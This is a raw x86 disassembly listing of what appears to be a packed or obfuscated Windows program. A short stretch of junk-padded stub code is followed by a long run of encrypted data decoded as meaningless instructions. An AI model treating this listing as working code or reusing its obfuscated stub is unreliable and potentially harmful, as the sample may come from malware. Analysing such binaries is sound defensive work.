  4027d5:	add    ecx,eax
  4027d7:	mov    DWORD PTR ds:0x422008,0x50f1
  4027e1:	cmp    esi,ecx
  4027e3:	jne    0x404d01
  4027e9:	add    DWORD PTR ds:0x420f9c,0x56b8
  4027f3:	push   DWORD PTR [ebp+0x8]
  4027f6:	call   0x40233b
  4027fb:	mov    DWORD PTR [ebp-0x18],eax
  4027fe:	mov    eax,DWORD PTR [ebp-0x4]
  402801:	xor    edi,edi
  402803:	xor    edi,DWORD PTR ds:0x420eb6
  402809:	xor    ecx,ecx
  40280b:	add    ecx,DWORD PTR ds:0x423014
  402811:	sub    edi,ecx
  402813:	or     edi,DWORD PTR [edi+ecx*1]
  402816:	mov    ecx,DWORD PTR [ebp-0x18]
  402819:	add    edi,DWORD PTR ds:0x420e9a
  40281f:	xor    eax,ebx
  402821:	mov    edi,0x3272dd
  402826:	add    eax,edi
  402828:	mov    DWORD PTR ds:0x422004,0x6f95
  402832:	cmp    ecx,eax
  402834:	mov    DWORD PTR ds:0x420e96,0x4ad4
  40283e:	je     0x404e26
  402844:	add    DWORD PTR ds:0x420e8a,0x2aaf
  40284e:	push   DWORD PTR [ebp-0x18]
  402851:	push   DWORD PTR [ebp+0x8]
  402854:	neg    DWORD PTR ds:0x420f70
  40285a:	call   0x410a1b
  40285f:	and    DWORD PTR ds:0x420eec,0x0
  402869:	mov    ecx,DWORD PTR ds:0x420eec
  40286f:	inc    ecx
  402870:	mov    DWORD PTR ds:0x420eec,ecx
  402876:	cmp    DWORD PTR ds:0x420eec,0x7
  40287d:	jne    0x402893
  402883:	push   0x4240e4
  402888:	push   0x424143
  40288d:	call   DWORD PTR ds:0x4247dd
  402893:	cmp    DWORD PTR ds:0x420eec,0x6
  40289a:	jne    0x4028ad
  4028a0:	mov    ecx,DWORD PTR ds:0x420eec
  4028a6:	inc    ecx
  4028a7:	mov    DWORD PTR ds:0x420eec,ecx
  4028ad:	cmp    DWORD PTR ds:0x420eec,0x11
  4028b4:	jb     0x402869
  4028ba:	xor    DWORD PTR ds:0x420f00,edx
  4028c0:	mov    DWORD PTR [ebp-0x18],eax
  4028c3:	adc    ecx,DWORD PTR ds:0x420ef8
  4028c9:	jmp    0x404c56
  4028ce:	rcr    DWORD PTR [ecx-0x1e],cl
  4028d1:	mov    fs,esp
  4028d3:	jno    0x402950
  4028d5:	sti    
  4028d6:	inc    esi
  4028d7:	scas   eax,DWORD PTR es:[edi]
  4028d8:	dec    ebx
  4028d9:	imul   edx,ecx,0x7a22b9a5
  4028df:	jp     0x40295b
  4028e1:	jp     0x4028ed
  4028e3:	pop    edi
  4028e4:	jp     0x402960
  4028e6:	adc    eax,0x1921172c
  4028eb:	and    eax,0x34652f1b
  4028f0:	imul   esp,DWORD PTR [esi-0x66],0x6d6a6a7e
  4028f7:	xor    al,ch
  4028f9:	fsubr  st(1),st
  4028fb:	push   eax
  4028fc:	dec    eax
  4028fd:	imul   esp,DWORD PTR [ecx+0x5b],0xffffff90
  402901:	pusha  
  402902:	ins    DWORD PTR es:[edi],dx
  402903:	pop    ecx
  402904:	iret   
  402905:	pop    ebp
  402906:	dec    edx
  402907:	and    BYTE PTR [edx+edi*8+0x4d577687],cl
  40290e:	jg     0x402947
  402910:	jo     0x4028b8
  402912:	jg     0x4028b4
  402914:	mov    ds:0x66ff2c3b,al
  402919:	fdiv   st(2),st
  40291b:	push   ebx
  40291c:	jg     0x40293c
  40291e:	in     eax,dx
  40291f:	cmp    ebp,ecx
  402921:	mov    edx,0xde1387ed
  402926:	mov    ebp,DWORD PTR [ecx]
  402928:	mulps  xmm5,XMMWORD PTR [ebx+0x6df7c48a]
  40292f:	fld    QWORD PTR [esp+edx*8]
  402932:	push   cs
  402933:	cli    
  402934:	sbb    BYTE PTR es:[eax+0xc],cl
  402938:	imul   ebp,DWORD PTR es:[eax-0x47],0xffffffaf
  40293d:	adc    eax,DWORD PTR [ecx+0x5]
  402940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402941:	(bad)  
  402942:	jmp    0x32b45490
  402947:	enter  0xf95b,0x1a
  40294b:	cli    
  40294c:	js     0x4028ef
  40294e:	arpl   bp,bx
  402950:	cwde   
  402951:	pop    edi
  402952:	mov    esp,DWORD PTR [ecx+0x31821407]
  402958:	repz sahf 
  40295a:	cmp    al,0x72
  40295c:	jae    0x402969
  40295e:	fisubr DWORD PTR ds:0x33348d52
  402964:	push   esp
  402965:	jecxz  0x402936
  402967:	mov    ch,BYTE PTR [ecx]
  402969:	mov    DWORD PTR [eax+0x5188ccb7],esi
  40296f:	in     al,0x45
  402971:	push   edx
  402972:	dec    esp
  402973:	or     al,0x3e
  402975:	repz add ebp,DWORD PTR ss:[ebp+0x30a7ca4b]
  40297d:	rol    BYTE PTR [esi+edx*2],0xfd
  402981:	push   edx
  402982:	push   esi
  402983:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402984:	stc    
  402985:	push   0x1c42f8bf
  40298a:	sub    al,0x82
  40298c:	dec    esp
  40298d:	and    ecx,DWORD PTR [ecx-0x3dcf04e8]
  402993:	jmp    0xe240:0x493fc794
  40299a:	mov    ?,ebx
  40299c:	ins    BYTE PTR es:[edi],dx
  40299d:	inc    esi
  40299e:	xchg   esi,eax
  40299f:	xchg   ebx,eax
  4029a0:	add    eax,0x3b64ea08
  4029a5:	inc    ebx
  4029a6:	dec    esi
  4029a7:	shl    DWORD PTR [ecx],1
  4029a9:	dec    esi
  4029aa:	mov    dh,0xa2
  4029ac:	sar    cl,1
  4029ae:	cmp    dh,BYTE PTR [eax]
  4029b0:	popw   es
  4029b2:	scas   al,BYTE PTR es:[edi]
  4029b3:	daa    
  4029b4:	fcomp  QWORD PTR [ebp-0x20]
  4029b7:	ret    
  4029b8:	push   ecx
  4029b9:	xchg   ecx,eax
  4029ba:	adc    esi,ebp
  4029bc:	mov    esp,0xd6032bc4
  4029c1:	call   0x327c:0xb6e6a8ec
  4029c8:	xchg   ecx,eax
  4029c9:	pop    edi
  4029ca:	fcomp  QWORD PTR [bp+si]
  4029cd:	xchg   edx,eax
  4029ce:	scas   al,BYTE PTR es:[edi]
  4029cf:	out    0x3c,al
  4029d1:	out    dx,eax
  4029d2:	pushf  
  4029d3:	dec    ecx
  4029d4:	int3   
  4029d5:	fstp   DWORD PTR [ecx+0x25]
  4029d8:	fucompp 
  4029da:	(bad)  
  4029db:	scas   al,BYTE PTR es:[edi]
  4029dc:	mov    al,ds:0x3e082287
  4029e1:	(bad)  
  4029e2:	or     eax,DWORD PTR [ebp-0x1b]
  4029e5:	xchg   BYTE PTR [edx],cl
  4029e7:	ret    
  4029e8:	sbb    al,0x11
  4029ea:	rcr    BYTE PTR [edi],0xf6
  4029ed:	inc    ecx
  4029ee:	lea    esp,[edx]
  4029f0:	jecxz  0x402a6f
  4029f2:	mov    dl,0x4
  4029f4:	leave  
  4029f5:	xor    al,0x32
  4029f7:	mov    ch,BYTE PTR [edx+ebx*1+0x5b6a5302]
  4029fe:	cdq    
  4029ff:	(bad)  
  402a00:	xchg   ebp,eax
  402a01:	pushf  
  402a02:	sub    eax,0x8f1301b0
  402a07:	push   ebx
  402a08:	push   ebx
  402a09:	mov    bl,0x39
  402a0b:	mov    ebx,0xf88c375d
  402a10:	adc    eax,0x8140fb29
  402a15:	loop   0x402a54
  402a17:	push   ds
  402a18:	icebp  
  402a19:	ja     0x402a18
  402a1b:	add    BYTE PTR [esi*1+0x2fe9b890],dh
  402a22:	xchg   ebp,eax
  402a24:	mov    cl,0xa1
  402a26:	xor    al,0x82
  402a28:	jbe    0x402a6c
  402a2a:	cmp    bh,bl
  402a2c:	fwait
  402a2d:	popf   
  402a2e:	ins    BYTE PTR es:[edi],dx
  402a2f:	cmc    
  402a30:	ss fs sub bh,bl
  402a34:	mov    cl,0x3f
  402a36:	sub    eax,0xa159527
  402a3b:	sbb    esi,ebp
  402a3d:	shr    BYTE PTR fs:[esi],0xd7
  402a41:	jnp    0x4029db
  402a43:	idiv   esi
  402a45:	inc    esi
  402a46:	(bad)  
  402a47:	jl     0x4029e0
  402a49:	fst    QWORD PTR [ecx+0x727101fd]
  402a4f:	call   0x80a83a24
  402a54:	daa    
  402a55:	outs   dx,BYTE PTR ds:[esi]
  402a56:	inc    esi
  402a57:	(bad)  
  402a58:	mov    bl,0x7e
  402a5a:	sub    DWORD PTR gs:[esi],esp
  402a5d:	mov    eax,0xa0ac87f7
  402a62:	jle    0x4029f9
  402a64:	or     edx,esp
  402a66:	(bad)  
  402a67:	cli    
  402a68:	inc    edx
  402a69:	push   esi
  402a6a:	jp     0x402a22
  402a6c:	jg     0x402acf
  402a6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a6f:	repnz mov ebp,0xa704507e
  402a75:	push   esp
  402a76:	out    0xa6,eax
  402a78:	fisub  DWORD PTR [edx+edx*4-0x67]
  402a7c:	inc    edx
  402a7d:	jl     0x402a19
  402a7f:	inc    ebx
  402a80:	nop
  402a81:	icebp  
  402a82:	xor    dl,BYTE PTR [esi-0x69c0d1e8]
  402a88:	out    dx,eax
  402a89:	or     edx,esp
  402a8b:	inc    esi
  402a8c:	adc    eax,0x1b855398
  402a91:	xor    DWORD PTR [ecx+ecx*1+0x57],0x24
  402a96:	rol    ch,cl
  402a98:	jecxz  0x402ab9
  402a9a:	inc    esp
  402a9b:	pop    edi
  402a9c:	je     0x402a35
  402a9e:	push   ecx
  402a9f:	bound  esp,QWORD PTR [edx-0x28]
  402aa2:	cmp    BYTE PTR [eax+0x67dde523],dh
  402aa8:	xchg   esi,eax
  402aa9:	xchg   esi,eax
  402aaa:	scas   eax,DWORD PTR es:[edi]
  402aab:	(bad)  
  402aac:	aas    
  402aad:	cmc    
  402aae:	in     eax,0xc8
  402ab0:	pop    ebx
  402ab1:	or     eax,0xa064f416
  402ab6:	fadd   st(6),st
  402ab8:	sbb    eax,DWORD PTR [ebp+0x1169d08f]
  402abe:	jmp    0x402ac4
  402ac0:	adc    dl,BYTE PTR [edi]
  402ac2:	sti    
  402ac3:	ins    BYTE PTR es:[edi],dx
  402ac4:	cdq    
  402ac5:	das    
  402ac6:	mov    bl,0x7e
  402ac8:	cmp    DWORD PTR [ebx+0x43],edx
  402acb:	xchg   DWORD PTR [ebp-0x20add89e],eax
  402ad1:	cli    
  402ad2:	jo     0x402b37
  402ad4:	mov    eax,0x4a8bf72c
  402ad9:	xor    al,0x3a
  402adb:	ins    BYTE PTR es:[edi],dx
  402adc:	pop    ebp
  402add:	xchg   edx,eax
  402ade:	out    dx,al
  402adf:	std    
  402ae0:	push   ebx
  402ae1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ae2:	pop    esp
  402ae3:	arpl   cx,sp
  402ae5:	or     al,0xb6
  402ae7:	aas    
  402ae8:	mov    ds:0x2dfbbce4,eax
  402aed:	pop    esi
  402aee:	sub    al,0xe5
  402af0:	xor    DWORD PTR [eax-0x62],esp
  402af3:	imul   esp,DWORD PTR [eax-0x3a],0x92e5ea15
  402afa:	popa   
  402afb:	mov    ebp,0x7297d693
  402b00:	cmp    al,0x30
  402b02:	iret   
  402b03:	test   eax,0x109de9c
  402b08:	fdiv   DWORD PTR [esi-0x1bf4b5a5]
  402b0e:	neg    edx
  402b10:	sub    bh,BYTE PTR [edi+ebx*4-0x17aa1ee5]
  402b17:	mov    bh,0x27
  402b19:	or     DWORD PTR [edx+0x13e08c9f],esp
  402b1f:	mov    cl,0x36
  402b21:	aas    
  402b22:	and    eax,0xc77b5790
  402b27:	xor    al,0x74
  402b29:	sbb    BYTE PTR [edx],cl
  402b2b:	sahf   
  402b2c:	cdq    
  402b2d:	cmp    DWORD PTR [ebp+0x618a041b],edx
  402b33:	aam    0x68
  402b35:	mov    bh,0x15
  402b37:	out    dx,eax
  402b38:	mov    ecx,DWORD PTR [ebx-0x3f]
  402b3b:	jle    0x402ac9
  402b3d:	mov    ds:0x92823d14,al
  402b42:	dec    ebp
  402b43:	loop   0x402b59
  402b45:	mov    dl,0x80
  402b47:	pop    eax
  402b48:	lods   al,BYTE PTR ds:[esi]
  402b49:	(bad)  
  402b4a:	mov    esp,0x8bb8f889
  402b4f:	adc    DWORD PTR [ebx+0xa],esp
  402b52:	jle    0x402ba0
  402b54:	mov    ah,0x65
  402b56:	xchg   ebx,eax
  402b57:	dec    edi
  402b58:	push   0xffffff99
  402b5a:	and    esi,ebp
  402b5c:	inc    edx
  402b5d:	inc    ebx
  402b5e:	bound  ebx,QWORD PTR [ebp-0x6]
  402b61:	addr16 and dh,ah
  402b64:	nop
  402b65:	fwait
  402b66:	mov    ah,0xe9
  402b68:	mov    esi,0x96b7a78d
  402b6d:	jecxz  0x402b69
  402b6f:	hlt    
  402b70:	push   ebp
  402b71:	leave  
  402b72:	clc    
  402b73:	ror    DWORD PTR [ebx+ecx*4+0x6bf10f52],cl
  402b7a:	loop   0x402b9d
  402b7c:	ds pop ss
  402b7e:	push   edx
  402b7f:	repnz add al,0x39
  402b82:	fstp   QWORD PTR [edx+0x51720ddd]
  402b88:	pop    ecx
  402b89:	bound  eax,QWORD PTR [ebx]
  402b8b:	stos   DWORD PTR es:[edi],eax
  402b8c:	scas   eax,DWORD PTR es:[edi]
  402b8d:	sub    al,0xb5
  402b8f:	jg     0x402b8e
  402b91:	fidivr WORD PTR fs:[ecx]
  402b94:	cmp    ax,0xcccb
  402b98:	clc    
  402b99:	mov    esi,0xf3ab526f
  402b9e:	cmp    eax,0x993d34af
  402ba3:	mov    ecx,0x28946148
  402ba8:	sahf   
  402ba9:	pushf  
  402baa:	ins    BYTE PTR es:[edi],dx
  402bab:	sbb    eax,0x5baa705c
  402bb0:	outs   dx,DWORD PTR ds:[esi]
  402bb1:	xchg   edi,eax
  402bb2:	add    al,0x3
  402bb4:	mov    al,0x92
  402bb6:	push   ecx
  402bb7:	mov    ch,0xdd
  402bb9:	add    bl,dh
  402bbb:	and    cl,bh
  402bbd:	outs   dx,DWORD PTR ds:[esi]
  402bbe:	mul    BYTE PTR [ecx+0x1c]
  402bc1:	push   ss
  402bc2:	push   ebx
  402bc3:	mov    cl,0xfd
  402bc5:	add    ah,BYTE PTR [ebx+ebx*4]
  402bc8:	jnp    0x402b5c
  402bca:	dec    ebp
  402bcb:	lds    ebx,FWORD PTR [esp+ebp*2+0x62]
  402bcf:	jne    0x402b94
  402bd1:	sbb    ebp,DWORD PTR [edx+0x6e]
  402bd4:	iret   
  402bd5:	mov    ecx,0x1bb5b41
  402bda:	xchg   BYTE PTR [ebx+0x16],cl
  402bdd:	in     al,0x16
  402bdf:	test   eax,0x69ed0b2
  402be4:	mov    ds:0x659c529a,eax
  402be9:	jne    0x402c2a
  402beb:	pop    ss
  402bec:	gs in  al,0xf1
  402bef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bf0:	push   esi
  402bf1:	adc    eax,0x6ac27216
  402bf6:	or     DWORD PTR ds:0xb5b86b3b,ebp
  402bfc:	(bad)  
  402bfe:	jnp    0x402c66
  402c00:	or     cl,BYTE PTR [ebx-0x7815f2e6]
  402c06:	jns    0x402bd4
  402c08:	cmp    bl,ch
  402c0a:	sub    DWORD PTR [edi+0x11],ecx
  402c0d:	mov    ah,0xc
  402c0f:	stos   DWORD PTR es:[edi],eax
  402c10:	stos   DWORD PTR es:[edi],eax
  402c11:	pop    ds
  402c12:	aad    0x73
  402c14:	loop   0x402bce
  402c16:	push   ebx
  402c17:	jmp    0x262f:0x5967141d
  402c1e:	xor    eax,ebx
  402c20:	fst    QWORD PTR [eax+0x60a930a2]
  402c26:	xchg   ecx,eax
  402c27:	push   eax
  402c28:	frstor [ecx]
  402c2a:	rcr    dl,1
  402c2c:	and    eax,0x9a2d3f7
  402c31:	or     ah,dh
  402c33:	stos   BYTE PTR es:[edi],al
  402c34:	ins    BYTE PTR es:[edi],dx
  402c35:	loope  0x402c87
  402c37:	mov    ah,0x7a
  402c39:	adc    BYTE PTR [ebp+0x28d8f10b],0xc0
  402c40:	js     0x402c1e
  402c42:	sub    bh,BYTE PTR [ecx+0x22]
  402c45:	repnz push ecx
  402c47:	fnsetpm(287 only) 
  402c49:	stos   BYTE PTR es:[edi],al
  402c4a:	aas    
  402c4b:	and    BYTE PTR [edi-0x2453ced9],cl
  402c51:	mov    eax,ds:0x5a750ef
  402c56:	stc    
  402c57:	mov    esp,0x58f3bf44
  402c5c:	mov    ah,0xf1
  402c5e:	cmp    BYTE PTR [eax+0x37],bh
  402c61:	add    al,0x9e
  402c63:	and    ah,BYTE PTR [ecx-0x18]
  402c66:	fsubr  st,st(7)
  402c68:	mov    BYTE PTR [ecx+0x40],bh
  402c6b:	xchg   edi,eax
  402c6c:	(bad)  
  402c6d:	mov    WORD PTR [edx+0x31cbe3e4],?
  402c73:	ins    DWORD PTR es:[edi],dx
  402c74:	xor    bh,BYTE PTR [eax+0x68b207d2]
  402c7a:	retf   0xbafc
  402c7d:	cmp    ecx,DWORD PTR [eax]
  402c7f:	fisub  WORD PTR [edi+ecx*2-0x49ddb39d]
  402c86:	or     DWORD PTR [ecx+0x66f1da73],eax
  402c8c:	pop    ds
  402c8d:	sar    BYTE PTR cs:[eax+0x20],1
  402c91:	popa   
  402c92:	loope  0x402c4f
  402c94:	xchg   bl,dl
  402c96:	ja     0x402c85
  402c98:	add    eax,DWORD PTR [eax]
  402c9a:	and    DWORD PTR [esi],ebx
  402c9c:	sti    
  402c9d:	loope  0x402c6f
  402c9f:	(bad)  
  402ca0:	gs push cs
  402ca2:	and    DWORD PTR [edi+esi*1],edx
  402ca5:	popf   
  402ca6:	xchg   ebx,eax
  402ca7:	mov    dh,0x1d
  402ca9:	fs mov cl,0xcf
  402cac:	bts    DWORD PTR [edx],0x2c
  402cb0:	dec    edx
  402cb1:	dec    edx
  402cb2:	pop    ebp
  402cb3:	push   eax
  402cb4:	in     al,0x67
  402cb6:	sbb    DWORD PTR ds:0x6651f97a,esp
  402cbc:	out    dx,al
  402cbd:	dec    ebx
  402cbe:	repnz adc BYTE PTR [eax+ebx*2-0x2],al
  402cc3:	ins    DWORD PTR es:[edi],dx
  402cc4:	jmp    0x402c6f
  402cc6:	dec    ebp
  402cc7:	mov    ecx,0x53183aee
  402ccc:	sbb    eax,0x9602e81e
  402cd1:	sbb    BYTE PTR [ebp+0x1a559eb7],dh
  402cd7:	cmp    al,0x5f
  402cd9:	sbb    DWORD PTR [esi],edx
  402cdb:	cdq    
  402cdc:	(bad)  
  402cdd:	cmp    BYTE PTR ds:[eax-0x1e],bh
  402ce1:	mov    cl,0xc0
  402ce3:	(bad)  
  402ce5:	outs   dx,BYTE PTR ds:[esi]
  402ce6:	cmp    eax,0x34f8f1f0
  402ceb:	inc    edi
  402cec:	cli    
  402ced:	cmp    al,0xd5
  402cef:	stos   BYTE PTR es:[edi],al
  402cf0:	or     al,0x79
  402cf2:	pop    ebx
  402cf3:	lea    esp,[ebx+0x5b59ebe5]
  402cf9:	imul   eax,DWORD PTR [edi],0xfc2ca4cf
  402cff:	xor    DWORD PTR [ebx-0x7dfe62ce],esi
  402d05:	loopne 0x402d0b
  402d07:	xlat   BYTE PTR ds:[ebx]
  402d08:	mov    cl,0xf6
  402d0a:	dec    ebx
  402d0b:	lds    edx,FWORD PTR [edx+esi*4]
  402d0e:	sub    eax,0xdcae41a9
  402d13:	ror    bl,cl
  402d15:	cld    
  402d16:	mov    eax,ds:0x4a05fbbe
  402d1b:	ins    DWORD PTR es:[edi],dx
  402d1c:	mov    esp,0x756aacdb
  402d21:	and    BYTE PTR [ecx],cl
  402d23:	ret    0x84ca
  402d26:	push   esi
  402d27:	out    dx,eax
  402d28:	inc    esp
  402d29:	inc    ebx
  402d2a:	fcmovu st,st(5)
  402d2c:	(bad)  
  402d2d:	pop    ebp
  402d2e:	in     eax,0x42
  402d30:	sbb    eax,0xd19183d7
  402d35:	aam    0x57
  402d37:	dec    eax
  402d38:	daa    
  402d39:	mov    gs,WORD PTR [esi+esi*2]
  402d3c:	inc    esp
  402d3d:	pop    edi
  402d3e:	scas   eax,DWORD PTR es:[edi]
  402d3f:	es push es
  402d41:	inc    esi
  402d42:	rcr    esp,0xdf
  402d45:	mov    ah,0xb2
  402d47:	and    dh,BYTE PTR ds:0xd21579db
  402d4d:	mov    DWORD PTR [esi+0x49],ebp
  402d50:	inc    ebx
  402d51:	jg     0x402db8
  402d53:	mov    ecx,DWORD PTR [ebp-0x48]
  402d56:	mov    al,ds:0x56109d43
  402d5b:	sbb    eax,0xb6c0b921
  402d60:	div    DWORD PTR [ebx-0x1a0c2e7d]
  402d66:	gs adc esi,edx
  402d69:	and    eax,0x55622519
  402d6e:	mov    ch,0xa5
  402d70:	jle    0x402d83
  402d72:	mov    BYTE PTR [edx],bh
  402d74:	jecxz  0x402d8b
  402d76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d77:	sbb    edx,DWORD PTR [edx-0x4defee27]
  402d7d:	xlat   BYTE PTR ds:[ebx]
  402d7e:	iret   
  402d7f:	xor    eax,0xe20346ac
  402d84:	sbb    ah,ah
  402d86:	loopne 0x402d94
  402d88:	leave  
  402d89:	mov    esp,0xd00d6179
  402d8e:	inc    esi
  402d8f:	test   BYTE PTR [ebx+0x1],bh
  402d92:	xchg   edi,eax
  402d93:	mov    ebp,0xc8731f69
  402d98:	fld    QWORD PTR [edx]
  402d9a:	leave  
  402d9b:	jle    0x402d26
  402d9d:	xor    eax,0xc29bde93
  402da2:	sbb    BYTE PTR [ecx-0x5a07371d],ch
  402da8:	jmp    0x402dd2
  402daa:	das    
  402dab:	xor    esi,DWORD PTR [edx-0x5973af83]
  402db1:	jne    0x402d77
  402db3:	rcl    DWORD PTR [esp+eax*8],1
  402db6:	in     al,dx
  402db7:	mov    dl,0xd2
  402db9:	add    al,0x3f
  402dbb:	inc    ebx
  402dbc:	mov    WORD PTR [esi+ecx*1],ds
  402dbf:	push   ds
  402dc0:	inc    ebp
  402dc1:	cmp    DWORD PTR [edi-0x5acb63c6],ebx
  402dc7:	loopne 0x402df6
  402dc9:	push   0xffffff90
  402dcb:	mov    eax,ds:0xcdd5a447
  402dd0:	pop    ecx
  402dd1:	xchg   edx,eax
  402dd2:	fadd   DWORD PTR [esi-0x17982b37]
  402dd8:	mov    dl,0x7c
  402dda:	and    eax,0x5c3da263
  402ddf:	sbb    DWORD PTR ds:0xb0ea80eb,esi
  402de5:	test   eax,0xef35e2d
  402dea:	cmp    dh,BYTE PTR [edi+edi*4+0x4cb29f4b]
  402df1:	jg     0x402de6
  402df3:	jle    0x402de1
  402df5:	lds    esi,FWORD PTR [edi-0x56]
  402df8:	mov    al,0x5a
  402dfa:	call   DWORD PTR [eax-0x4dbf4534]
  402e00:	cmp    al,0x7c
  402e02:	icebp  
  402e03:	cld    
  402e04:	dec    esi
  402e05:	lea    esi,cs:[edi]
  402e08:	hlt    
  402e09:	cmp    esi,DWORD PTR [edi-0x41]
  402e0c:	xor    eax,0x7470b985
  402e11:	imul   esi,DWORD PTR [eax-0x23d6dbe4],0xffffffd0
  402e18:	call   0x5b39:0xaeb98d3d
  402e1f:	mov    ds:0x300c2f3b,eax
  402e24:	and    eax,0x107af30f
  402e29:	mov    ebp,0xf221ca42
  402e2e:	xchg   edi,eax
  402e2f:	jae    0x402e12
  402e31:	push   0x98b9ef25
  402e36:	popf   
  402e37:	sub    al,0x7a
  402e39:	lea    ebx,[edi-0x3b71f895]
  402e3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e40:	mov    esp,0x95b18598
  402e45:	lods   eax,DWORD PTR ds:[esi]
  402e46:	sar    DWORD PTR [edx-0x1d4e55c8],1
  402e4c:	mov    WORD PTR [edx-0x60],fs
  402e4f:	(bad)  [edx+0x2e]
  402e52:	(bad)
  402e56:	sub    esp,DWORD PTR [esi-0x41]
  402e59:	dec    edi
  402e5a:	div    DWORD PTR [ebp+0x2e]
  402e5d:	aam    0xfe
  402e5f:	pusha  
  402e60:	pop    eax
  402e61:	out    dx,al
  402e62:	or     edx,ecx
  402e64:	lods   eax,DWORD PTR ds:[esi]
  402e65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e66:	imul   ecx,DWORD PTR [edi+eiz*4+0x4096e410],0xffffffbd
  402e6e:	sar    DWORD PTR [ebx],1
  402e70:	adc    ebp,DWORD PTR [ecx-0x5b3846bd]
  402e76:	loop   0x402eab
  402e78:	sbb    edi,ebx
  402e7a:	lea    ecx,[eax-0x36e44a4f]
  402e80:	xchg   edx,eax
  402e81:	jge    0x402ef0
  402e83:	jne    0x402e87
  402e85:	test   BYTE PTR cs:[esi+edx*1-0x2fea9883],cl
  402e8d:	stos   BYTE PTR es:[edi],al
  402e8e:	repnz add eax,0x723b3ea6
  402e94:	inc    ebp
  402e95:	pop    edi
  402e96:	ds jbe 0x402e50
  402e99:	cmc    
  402e9a:	cmp    ebx,esi
  402e9c:	push   edi
  402e9d:	add    eax,0x6bc2a3bd
  402ea2:	fsubr  DWORD PTR [ebx]
  402ea4:	push   ecx
  402ea5:	xor    ecx,esp
  402ea7:	xchg   esp,eax
  402ea8:	out    dx,eax
  402ea9:	inc    ebp
  402eaa:	mov    edx,0x83c3dee6
  402eaf:	pop    ebx
  402eb0:	sub    al,0xd6
  402eb2:	push   esi
  402eb3:	pop    es
  402eb4:	(bad)  
  402eb5:	lock stos DWORD PTR es:[edi],eax
  402eb7:	cmp    bh,BYTE PTR [eax+0x5f]
  402eba:	hlt    
  402ebb:	jge    0x402e4d
  402ebd:	das    
  402ebe:	jge    0x402f28
  402ec0:	outs   dx,BYTE PTR ds:[esi]
  402ec1:	sbb    al,0x16
  402ec3:	push   ds
  402ec4:	mov    ds:0x5afb1258,al
  402ec9:	retf   
  402eca:	std    
  402ecb:	adc    ch,ah
  402ecd:	test   eax,0x31d909b6
  402ed2:	cmp    al,0x9b
  402ed4:	xchg   ebx,eax
  402ed5:	jae    0x402f06
  402ed7:	int3   
  402ed8:	mov    ecx,0x1e592416
  402edd:	mov    edi,0x12b8c779
  402ee2:	jg     0x402f3a
  402ee4:	pop    esi
  402ee5:	sahf   
  402ee6:	pop    ds
  402ee7:	aas    
  402ee8:	pop    ebx
  402ee9:	jae    0x402f58
  402eeb:	push   0x50103f05
  402ef0:	int    0xfa
  402ef2:	xchg   dh,ch
  402ef4:	lds    ecx,FWORD PTR [ebx-0x7cd8a6d5]
  402efa:	xchg   esi,eax
  402efb:	pusha  
  402efc:	arpl   WORD PTR [ebp-0xc6e65bf],dx
  402f02:	dec    ebp
  402f03:	xchg   ebx,eax
  402f04:	inc    esp
  402f05:	daa    
  402f06:	mov    dh,0xa3
  402f08:	imul   ebx,esp,0x4e95a5dd
  402f0e:	xor    al,0x3d
  402f10:	stos   DWORD PTR es:[edi],eax
  402f11:	mov    edi,0x5ce9b35e
  402f16:	pop    esi
  402f17:	(bad)  
  402f18:	popf   
  402f19:	repnz out dx,ax
  402f1c:	ins    BYTE PTR es:[edi],dx
  402f1d:	jg     0x402f03
  402f1f:	cmp    edi,DWORD PTR [esi+ebp*1+0x1f5050d7]
  402f26:	xchg   esi,eax
  402f27:	enter  0xbdae,0xc3
  402f2b:	shl    BYTE PTR [ebp+0x449e942c],1
  402f31:	bnd jno 0x402efb
  402f34:	mov    eax,ds:0x2408d765
  402f39:	pop    ss
  402f3a:	jae    0x402efe
  402f3c:	or     eax,DWORD PTR [edi+0x153f74b9]
  402f42:	sbb    BYTE PTR [eax],bl
  402f44:	pushf  
  402f45:	mov    bl,0x73
  402f47:	in     eax,0x9c
  402f49:	cmp    eax,DWORD PTR [eax+esi*4]
  402f4c:	rcl    dh,cl
  402f4e:	out    0xe1,al
  402f50:	xlat   BYTE PTR ds:[ebx]
  402f51:	retf   
  402f52:	loopne 0x402f3e
  402f54:	out    dx,al
  402f55:	cli    
  402f56:	mov    DWORD PTR [ebx+0x30aee8ef],esi
  402f5c:	enter  0xf92e,0x4
  402f60:	retf   
  402f61:	jmp    0x9c944392
  402f66:	sub    eax,esi
  402f68:	jmp    0x402fc4
  402f6a:	mov    al,bl
  402f6c:	(bad)  
  402f6d:	sub    dl,BYTE PTR [eax-0x5b9dfc91]
  402f73:	mov    dh,0x8f
  402f75:	hlt    
  402f76:	and    DWORD PTR [ecx],ecx
  402f78:	xchg   esi,eax
  402f79:	je     0x402f62
  402f7b:	mov    WORD PTR [edx-0x5d],ss
  402f7e:	jl     0x402fea
  402f80:	and    eax,ecx
  402f82:	mov    esi,0x58780b33
  402f87:	pushf  
  402f88:	int    0xa7
  402f8a:	jg     0x402f16
  402f8c:	xor    al,0xa6
  402f8e:	and    eax,0x294ff170
  402f93:	cmc    
  402f94:	mov    DWORD PTR [ebp+0x409eb79e],esp
  402f9a:	cdq    
  402f9b:	mov    bh,BYTE PTR [ebx+0x59]
  402f9e:	clc    
  402f9f:	sbb    bh,0x10
  402fa2:	sbb    edx,esi
  402fa4:	fsubr  DWORD PTR [edx+0x5f]
  402fa7:	jg     0x402ffa
  402fa9:	leave  
  402faa:	(bad)  [eax-0x8]
  402fad:	js     0x40302c
  402faf:	pop    ds
  402fb0:	pop    ebp
  402fb1:	or     ebx,0xd82bbf32
  402fb7:	mov    dh,BYTE PTR [ebx+0x8]
  402fba:	cld    
  402fbb:	mov    ds:0x827f2ac7,al
  402fc0:	out    dx,eax
  402fc1:	dec    ecx
  402fc2:	jbe    0x403016
  402fc4:	pop    esp
  402fc5:	popf   
  402fc6:	call   0x5c78d184
  402fcb:	xchg   DWORD PTR [edx+0x1b],esi
  402fce:	addr16 int3 
  402fd0:	pop    eax
  402fd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fd2:	into   
